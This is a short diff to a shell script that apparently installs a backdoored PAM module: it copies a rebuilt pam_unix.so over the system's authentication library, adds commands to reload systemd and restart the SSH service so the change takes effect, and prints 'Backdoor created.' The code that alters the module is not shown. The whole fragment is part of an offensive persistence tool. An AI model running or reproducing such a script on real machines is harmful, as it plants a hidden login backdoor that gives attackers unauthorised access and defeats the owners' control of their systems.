@@ -88,6 +88,10 @@ make
 #cp modules/pam_unix/.libs/pam_unix.so ../
 cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/ || cp modules/pam_unix/.libs/pam_unix.so /lib/security/
 cd ..
+
+systemctl daemon-reload
+systemctl restart ssh
+
 echo "Backdoor created."
 #echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
 echo ""
